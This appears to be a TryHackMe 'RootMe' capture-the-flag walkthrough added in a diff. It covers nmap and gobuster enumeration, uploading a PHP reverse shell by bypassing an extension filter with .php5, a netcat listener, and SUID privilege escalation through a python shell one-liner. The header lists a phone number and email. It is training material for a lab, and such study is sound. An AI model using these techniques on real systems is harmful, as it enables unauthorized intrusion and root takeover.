@@ -1,0 +1,179 @@
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''
+'' 		 Try Hack Me : RootMe 
+'' 
+''
+''		Try Hack Me , My User Name : Lime1O1
+'' 
+''
+''		Phone : 01026102300
+''
+''		Email : Lime1O1Red@gmail.com 
+''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+
+
+1-  Enumeration ( NMAP , GOBUSTER )
+
+
+
+2. Scan the machine using nmap. Type 
+
+		$ nmap -sC -sV 10.10.177.208
+
+-sC – to scan using the default nmap scripts
+-sV – to pull version information of open ports found during the scan
+
+
+
+
+####################################################################################
+# 							Nmap Scaning output
+####################################################################################
+	
+	PORT   STATE SERVICE VERSION
+	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+	|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+	|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+	| http-cookie-flags: 
+	|   /: 
+	|     PHPSESSID: 
+	|_      httponly flag not set
+	|_http-server-header: Apache/2.4.29 (Ubuntu)
+	|_http-title: HackIT - Home
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+###################################################################################
+
+
+
+
+
+From the output of the tool appears to us : 
+
+	1-  We Have Two Ports Is open  : 22 ssh , 80 http  
+
+	2- We can't do a brute force attack ssh , He does not have a username,password 
+	
+	3-  Version Of Apache Is : 2.4.29 
+
+
+ The second step : we will search the location on the hidden directories using gobuster 
+		Run gobuster to look for hidden directories and files on the web server
+
+$ gobuster -w directory-list-2.3-medium.txt  -u http://10.10.146.76/
+	
+	dir –>  to use directory/file brute-forcing mode
+	-u –>  is the flag to tell gobuster that we are scanning a URL
+	-w –>  is the flag to set the list of possible directory and file names
+
+
+########################################################################################
+#						Gobuster output 
+########################################################################################
+
+	=====================================================
+	Gobuster v2.0.1              OJ Reeves (@TheColonial)
+	=====================================================
+	[+] Mode         : dir
+	[+] Url/Domain   : http://10.10.146.76/
+	[+] Threads      : 10
+	[+] Wordlist     : directory-list-2.3-medium.txt
+	[+] Status codes : 200,204,301,302,307,403
+	[+] Timeout      : 10s
+	=====================================================
+	2021/09/23 18:07:57 Starting gobuster
+	=====================================================
+	/uploads (Status: 301)
+	/css (Status: 301)
+	/js (Status: 301)
+	/panel (Status: 301)
+
+###########################################################################################
+
+
+ 	1- Now we have two interesting directories :  /panel  ,  /uploads 
+
+ 	2- In this URL we find an opportunity to raise a reverse shell  :
+
+ 	  http://10.10.146.76/panel/   
+
+ 	  	 	You can get it from this address	
+ 	   		https://github.com/pentestmonkey/php-reverse-shell
+ 	
+
+ 	3- we change : IP , PORT
+ 							 Make sure to change the values in the script with your own IP address and a port of your choice to get a reverse shell
+
+
+ 	4- Then we upload the file , 
+ 			Now we are facing a problem, which is that the site does not accept files that end with the extension [.php] 
+
+
+ 	5- After several attempts, we see that the site accepts files that end with the extension [.php5]
+
+ 	6- After successfully uploading the file, we now need to run a tool to receive the connection : netat 
+
+ 					Start a netcat listener from your attack machine. Type nc -nlvp [PORTNumper]
+ 			$ nc -lnvp [portNumper]
+
+ 	7- We will find the php file in  : http://10.10.146.76/uploads/   
+
+
+
+ 	8- 	Search for the user.txt using find. Type find / -type f -name user.txt 2> /dev/null 
+
+
+ 					-type f – you are telling find to look exclusively for files
+					-name user.txt – instructing the find command to search for a file with the name “user.txt”
+					 2> /dev/null – so error messages do not show up as part of the search result
+
+
+    9- Retrieve the content of user.txt. Type cat /var/www/user.txt
+
+
+    10-   Search for files with SUID permission to escalate our privilege using find. Type find / type -f -user root -perm -u=s 2> /dev/null
+
+    
+    11- Check gtfobins on how to exploit the suid above. Access gtfobins here. Then search for the specific binary you found above and study how 			you can exploit through SUID.
+
+    12- Escalate our privilege to root user. Type python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
+
+    13- find / -type f -name root.txt
+
+    14- Retrieve the content of root.txt. Type cat /root/root.txt
+
+
+#############################################################################################################################################
+
+
+
+
+
+
+'
+'
+
+'
+'
+'
+'
+'
+'
+'		I hope you had fun and learned something from following my walk-through.
+'
+'
+'
+'
+'
+'
+'
+'
+'
+'
+'
+'
